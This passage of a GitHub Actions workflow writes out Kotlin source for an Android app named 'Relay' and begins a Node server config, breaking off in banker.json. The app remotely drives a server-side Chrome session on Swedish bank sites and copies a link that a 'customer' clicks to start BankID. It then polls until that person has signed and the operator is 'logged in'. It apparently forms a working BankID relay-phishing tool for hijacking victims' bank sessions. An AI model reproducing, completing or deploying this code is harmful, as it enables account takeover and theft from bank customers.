name: build

on:
  push:
    branches: [ main ]
  workflow_dispatch:

concurrency:
  group: relay-${{ github.ref }}
  cancel-in-progress: true

jobs:
  apk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Skriv kallfiler
        run: |
          w() { mkdir -p "$(dirname "$1")"; cat > "$1"; }

          w .gitignore <<'EOF'
          .gradle/
          build/
          app/build/
          local.properties
          bygg.log
          server/sessioner.json
          server/logg.jsonl
          server/lar.json
          server/node_modules/
          cprof/
          EOF

          w settings.gradle.kts <<'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "relay"
          include(":app")
          EOF

          w build.gradle.kts <<'EOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          EOF

          w gradle.properties <<'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          kotlin.code.style=official
          EOF

          w app/build.gradle.kts <<'EOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }
          android {
              namespace = "com.relay"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.relay"
                  minSdk = 26
                  targetSdk = 34
                  versionCode = 301
                  versionName = "3.0.1"
              }
              buildTypes { getByName("debug") { isMinifyEnabled = false } }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
          }
          dependencies { }
          EOF

          w app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET"/>
              <application
                  android:label="Relay"
                  android:usesCleartextTraffic="true">
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.Relay"
                      android:configChanges="orientation|screenSize|keyboardHidden">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

          w app/src/main/res/values/styles.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <style name="Theme.Relay" parent="android:Theme.Material.NoActionBar"/>
          </resources>
          EOF

          w app/src/main/java/com/relay/MainActivity.kt <<'EOF'
          package com.relay

          import android.app.Activity
          import android.content.ActivityNotFoundException
          import android.content.ClipData
          import android.content.ClipboardManager
          import android.content.Context
          import android.content.Intent
          import android.content.SharedPreferences
          import android.graphics.BitmapFactory
          import android.graphics.Color
          import android.graphics.drawable.BitmapDrawable
          import android.net.Uri
          import android.os.Bundle
          import android.os.Handler
          import android.os.Looper
          import android.util.Base64
          import android.view.MotionEvent
          import android.widget.Button
          import android.widget.EditText
          import android.widget.HorizontalScrollView
          import android.widget.ImageView
          import android.widget.LinearLayout
          import android.widget.TextView
          import org.json.JSONObject
          import java.net.HttpURLConnection
          import java.net.URL

          class MainActivity : Activity() {

              private lateinit var prefs: SharedPreferences
              private lateinit var urlField: EditText
              private lateinit var bankField: EditText
              private lateinit var bankRad: LinearLayout
              private lateinit var textField: EditText
              private lateinit var skarm: ImageView
              private lateinit var statusView: TextView
              private lateinit var debugView: TextView
              private lateinit var linkView: TextView

              private val ui = Handler(Looper.getMainLooper())
              private val rader = ArrayDeque<String>()

              @Volatile private var bank = "swedbank"
              @Volatile private var code = ""
              @Volatile private var inloggad = false
              @Volatile private var signed = false
              @Volatile private var stopp = false
              @Volatile private var laddar = false
              @Volatile private var rullar = false
              @Volatile private var chromeOk = false
              @Volatile private var kortUrl = ""
              @Volatile private var nedY = 0f
              @Volatile private var vpW = 412
              @Volatile private var vpH = 900

              override fun onCreate(s: Bundle?) {
                  super.onCreate(s)
                  prefs = getSharedPreferences("relay", MODE_PRIVATE)
                  code = prefs.getString("code", "") ?: ""
                  bank = prefs.getString("bank", "swedbank") ?: "swedbank"
                  byggUi()
                  laddaBanker()
                  laddaConfig()
                  startaSkarm()
                  startaPoll()
              }

              private fun byggUi() {
                  val root = LinearLayout(this)
                  root.orientation = LinearLayout.VERTICAL
                  root.setBackgroundColor(Color.parseColor("#0f1419"))

                  urlField = felt("server-url  https://xxx.trycloudflare.com", prefs.getString("url", "") ?: "")
                  root.addView(urlField, lp())

                  val hs = HorizontalScrollView(this)
                  hs.isHorizontalScrollBarEnabled = false
                  bankRad = LinearLayout(this)
                  bankRad.orientation = LinearLayout.HORIZONTAL
                  hs.addView(bankRad)
                  root.addView(hs, LinearLayout.LayoutParams(-1, -2))

                  bankField = felt("bank-url (anvands i Egen-lage)", prefs.getString("bankurl", "") ?: "")
                  root.addView(bankField, lp())

                  val r1 = LinearLayout(this); r1.orientation = LinearLayout.HORIZONTAL
                  val kor = knapp("KOR", "#2b6cb0")
                  val ny = knapp("NY ORDER", "#b7791f")
                  val lank = knapp("LANK", "#2b6cb0")
                  val kod = knapp("KOD", "#4a5568")
                  val logg = knapp("LOGG", "#4a5568")
                  r1.addView(kor, lpv()); r1.addView(ny, lpv()); r1.addView(lank, lpv())
                  r1.addView(kod, lpv()); r1.addView(logg, lpv())
                  root.addView(r1)

                  val r2 = LinearLayout(this); r2.orientation = LinearLayout.HORIZONTAL
                  textField = felt("skriv / css-selektor", "")
                  r2.addView(textField, LinearLayout.LayoutParams(0, -2, 2.2f))
                  val txt = knapp("TXT", "#4a5568")
                  val ent = knapp("ENT", "#4a5568")
                  val tab = knapp("TAB", "#4a5568")
                  val bsk = knapp("BSK", "#4a5568")
                  val sel = knapp("SEL", "#4a5568")
                  r2.addView(txt, lpv()); r2.addView(ent, lpv()); r2.addView(tab, lpv())
                  r2.addView(bsk, lpv()); r2.addView(sel, lpv())
                  root.addView(r2)

                  linkView = TextView(this)
                  linkView.setTextColor(Color.parseColor("#9ae6b4"))
                  linkView.textSize = 11f
                  linkView.setTextIsSelectable(true)
                  root.addView(linkView, lp())

                  statusView = TextView(this)
                  statusView.setTextColor(Color.WHITE)
                  statusView.textSize = 13f
                  root.addView(statusView, lp())

                  debugView = TextView(this)
                  debugView.setTextColor(Color.parseColor("#ecc94b"))
                  debugView.textSize = 10f
                  root.addView(debugView, lp())

                  skarm = ImageView(this)
                  skarm.scaleType = ImageView.ScaleType.FIT_XY
                  skarm.setBackgroundColor(Color.BLACK)
                  skarm.isClickable = true
                  root.addView(skarm, LinearLayout.LayoutParams(-1, 0, 1f))

                  setContentView(root)

                  skarm.addOnLayoutChangeListener { _, _, _, _, _, _, _, _, _ ->
                      val w = skarm.width; val h = skarm.height
                      if (w > 60 && h > 60) {
                          val d = resources.displayMetrics.density
                          vpW = (w / d).toInt()
                          vpH = (h / d).toInt()
                          skickaViewport()
                      }
                  }

                  skarm.setOnTouchListener { _, e ->
                      when (e.actionMasked) {
                          MotionEvent.ACTION_DOWN -> { nedY = e.y; rullar = true; true }
                          MotionEvent.ACTION_UP -> {
                              val dy = e.y - nedY
                              if (Math.abs(dy) > 30f) {
                                  trad { post(u() + "/api/rulla", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
                                      ",\"y\":" + py(e.y) + ",\"dy\":" + (-dy * vpH / skarm.height) + "}") }
                              } else {
                                  trad { post(u() + "/api/peka", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
                                      ",\"y\":" + py(e.y) + "}") }
                              }
                              rullar = false
                              true
                          }
                          else -> false
                      }
                  }

                  kor.setOnClickListener {
                      prefs.edit().putString("url", urlField.text.toString().trim())
                          .putString("bankurl", bankField.text.toString().trim())
                          .putString("bank", bank).apply()
                      if (u().isEmpty()) { statusView.text = "FYLL I SERVER-URL FORST"; return@setOnClickListener }
                      code = ""; signed = false; inloggad = false
                      linkView.text = ""
                      statusView.text = "KOR " + bank + " - oppnar i chrome"
                      trad {
                          try {
                              val s = post(u() + "/api/kor", JSONObject()
                                  .put("bank", bank).put("url", bankField.text.toString().trim()).toString())
                              val j = JSONObject(s)
                              if (j.optBoolean("ok")) {
                                  code = j.optString("code")
                                  prefs.edit().putString("code", code).apply()
                                  ui.post { statusView.text = "SESSION " + code + " - tryck LANK" }
                                  logga("KOR " + bank + " " + code)
                              } else {
                                  ui.post { statusView.text = "KOR-FEL: " + j.optString("fel") }
                              }
                          } catch (e: Throwable) {
                              ui.post { statusView.text = "KOR-FEL (server)" }
                              logga("KOR " + e.toString().take(90))
                          }
                      }
                  }

                  ny.setOnClickListener {
                      if (code.isEmpty()) { statusView.text = "INGEN SESSION"; return@setOnClickListener }
                      trad { post(u() + "/api/nyorder", JSONObject().put("code", code).toString()) }
                      statusView.text = "NY ORDER - ny token, samma lank"
                  }

                  lank.setOnClickListener { kopiera("/b?code=", true) }
                  kod.setOnClickListener { kopiera("/k?code=", false) }
                  logg.setOnClickListener {
                      try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(u() + "/logg"))) }
                      catch (e: ActivityNotFoundException) { statusView.text = "ingen webblasare" }
                  }

                  txt.setOnClickListener {
                      val t = textField.text.toString()
                      if (t.isEmpty()) return@setOnClickListener
                      trad { post(u() + "/api/text", JSONObject().put("bank", bank).put("t", t).toString()) }
                      textField.setText("")
                  }
                  ent.setOnClickListener { tangent("enter") }
                  tab.setOnClickListener { tangent("tab") }
                  bsk.setOnClickListener { tangent("back") }
                  sel.setOnClickListener {
                      val t = textField.text.toString().trim()
                      if (t.isEmpty()) return@setOnClickListener
                      trad { post(u() + "/api/klick", JSONObject().put("bank", bank).put("sel", t).toString()) }
                      statusView.text = "klickar " + t
                  }

                  statusView.text = "kor bash server/start.sh i Termux forst"
              }

              private fun tangent(k: String) {
                  trad { post(u() + "/api/tangent", JSONObject().put("bank", bank).put("k", k).toString()) }
              }

              private fun kopiera(suffix: String, kort: Boolean) {
                  if (code.isEmpty()) { statusView.text = "INGEN KOD ANN - tryck KOR"; return }
                  val bas = if (kort && kortUrl.isNotEmpty()) kortUrl else u()
                  val l = bas.trimEnd('/') + suffix + code
                  linkView.text = l
                  (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
                      .setPrimaryClip(ClipData.newPlainText("lank", l))
                  statusView.text = if (suffix.startsWith("/b")) "LANK KOPIERAD - kunden klickar, BankID startar" else "KODSIDA KOPIERAD"
              }

              private fun px(x: Float) = (x / skarm.width * vpW).toInt()
              private fun py(y: Float) = (y / skarm.height * vpH).toInt()
              private fun u() = urlField.text.toString().trim().trimEnd('/')

              private fun skickaViewport() {
                  val uu = u()
                  if (uu.isEmpty()) return
                  trad { try { post(uu + "/api/viewport", "{\"w\":" + vpW + ",\"h\":" + vpH + "}") } catch (e: Throwable) {} }
              }

              private fun laddaConfig() {
                  trad {
                      try {
                          val j = JSONObject(get(u() + "/api/config"))
                          kortUrl = j.optString("kortUrl") ?: ""
                          if (kortUrl.isNotEmpty()) ui.post { logga("kort lank: " + kortUrl) }
                      } catch (e: Throwable) { }
                  }
              }

              private fun laddaBanker() {
                  trad {
                      try {
                          val j = JSONObject(get(u() + "/api/banker"))
                          val arr = j.optJSONArray("banker")
                          if (arr != null) {
                              val bygg = ArrayList<Triple<String, String, String>>()
                              for (i in 0 until arr.length()) {
                                  val o = arr.getJSONObject(i)
                                  bygg.add(Triple(o.optString("nyckel"), o.optString("namn"), o.optString("start")))
                              }
                              ui.post {
                                  bankRad.removeAllViews()
                                  for ((k, n, st) in bygg) {
                                      val b = knapp(n, if (k == bank) "#2b6cb0" else "#334155")
                                      b.textSize = 11f
                                      b.setOnClickListener { veljBank(k, st) }
                                      bankRad.addView(b, LinearLayout.LayoutParams(-2, -2)
                                          .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
                                  }
                                  val fri = knapp("Egen", if (bank == "fri") "#2b6cb0" else "#334155")
                                  fri.textSize = 11f
                                  fri.setOnClickListener { veljBank("fri", null) }
                                  bankRad.addView(fri, LinearLayout.LayoutParams(-2, -2)
                                      .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
                              }
                          }
                      } catch (e: Throwable) {
                          ui.post { logga("banker-fel " + e.toString().take(80)) }
                      }
                  }
              }

              private fun veljBank(k: String, start: String?) {
                  bank = k
                  if (start != null && start.isNotEmpty()) bankField.setText(start)
                  prefs.edit().putString("bank", k).apply()
                  statusView.text = "bank vald: " + k
                  laddaBanker()
              }

              private fun startaSkarm() {
                  Thread {
                      while (!stopp) {
                          val uu = u()
                          if (uu.isNotEmpty() && !laddar) {
                              laddar = true
                              try {
                                  val s = get(uu + "/api/skarm?bank=" + bank + "&t=" + System.currentTimeMillis())
                                  val j = JSONObject(s)
                                  if (j.optBoolean("ok")) {
                                      chromeOk = true
                                      val bytes = Base64.decode(j.optString("bild"), Base64.DEFAULT)
                                      val bm = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                      ui.post {
                                          if (bm != null) {
                                              val gammal = skarm.drawable
                                              skarm.setImageBitmap(bm)
                                              (gammal as? BitmapDrawable)?.bitmap?.recycle()
                                          }
                                      }
                                  } else {
                                      chromeOk = false
                                  }
                              } catch (e: Throwable) { chromeOk = false }
                              laddar = false
                          }
                          try { Thread.sleep(if (rullar) 320L else 1000L) } catch (e: Throwable) { }
                      }
                  }.start()
              }

              private fun startaPoll() {
                  Thread {
                      var visaChromeFel = true
                      while (!stopp) {
                          val c = code
                          val uu = u()
                          if (c.isNotEmpty() && uu.isNotEmpty()) {
                              try {
                                  val j = JSONObject(get(uu + "/api/state?code=" + c))
                                  if (j.optBoolean("inloggad") && !inloggad) {
                                      inloggad = true; signed = true
                                      ui.post { statusView.text = "INLOGGAD - verifierat pa sidan" }
                                  }
                                  if (j.optBoolean("signed") && !signed) {
                                      signed = true
                                      ui.post { statusView.text = "KUNDEN HAR SIGNERAT - vantar pa inloggning" }
                                  }
                                  val lg = j.optJSONArray("logg")
                                  if (lg != null && lg.length() > 0) {
                                      val sista = lg.optString(lg.length() - 1)
                                      ui.post { if (rader.isEmpty() || rader.last() != sista) logga(sista) }
                                  }
                              } catch (e: Throwable) { }
                          }
                          if (!chromeOk && visaChromeFel) {
                              visaChromeFel = false
                              ui.post { if (statusView.text.isEmpty()) statusView.text = "chrome inte kopplad - kor start.sh" }
                          }
                          if (chromeOk) visaChromeFel = true
                          try { Thread.sleep(2000) } catch (e: Throwable) { }
                      }
                  }.start()
              }

              private fun post(u: String, body: String): String {
                  val c = URL(u).openConnection() as HttpURLConnection
                  c.requestMethod = "POST"
                  c.connectTimeout = 12000
                  c.readTimeout = 25000
                  c.doOutput = true
                  c.setRequestProperty("Content-Type", "application/json")
                  c.outputStream.use { it.write(body.toByteArray()) }
                  val sc = c.responseCode
                  return (if (sc in 200..299) c.inputStream else c.errorStream)
                      ?.bufferedReader()?.use { it.readText() } ?: ""
              }

              private fun get(u: String): String {
                  val c = URL(u).openConnection() as HttpURLConnection
                  c.connectTimeout = 12000
                  c.readTimeout = 25000
                  val sc = c.responseCode
                  return (if (sc in 200..299) c.inputStream else c.errorStream)
                      ?.bufferedReader()?.use { it.readText() } ?: ""
              }

              private fun trad(b: () -> Unit) {
                  Thread { try { b() } catch (e: Throwable) { ui.post { logga("FEL " + e.toString().take(90)) } } }.start()
              }

              private fun logga(s: String) {
                  ui.post {
                      rader.addLast(s.replace("\n", " ").take(180))
                      while (rader.size > 6) rader.removeFirst()
                      debugView.text = rader.joinToString("\n")
                  }
              }

              private fun lp(): LinearLayout.LayoutParams =
                  LinearLayout.LayoutParams(-1, -2).also { it.setMargins(dp(6), dp(2), dp(6), dp(2)) }

              private fun lpv(): LinearLayout.LayoutParams =
                  LinearLayout.LayoutParams(0, -2, 1f).also { it.setMargins(dp(2), dp(2), dp(2), dp(2)) }

              private fun knapp(t: String, c: String): Button {
                  val b = Button(this)
                  b.text = t
                  b.textSize = 11f
                  b.setBackgroundColor(Color.parseColor(c))
                  b.setTextColor(Color.WHITE)
                  return b
              }

              private fun felt(hint: String, text: String): EditText {
                  val e = EditText(this)
                  e.hint = hint
                  e.setText(text)
                  e.setTextColor(Color.WHITE)
                  e.setHintTextColor(Color.parseColor("#6b7280"))
                  e.textSize = 12f
                  e.setSingleLine(true)
                  return e
              }

              private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

              override fun onDestroy() { stopp = true; super.onDestroy() }
          }
          EOF

          w server/package.json <<'EOF'
          {
            "name": "relay-server",
            "version": "3.0.1",
            "private": true,
            "scripts": { "start": "node server.js" },
            "dependencies": { "ws": "^8.18.0" }
          }
          EOF

          w server/banker.json <<'EOF'
          {
            "swedbank": {
              "namn": "Swedbank",
              "farg": "#0057B8",
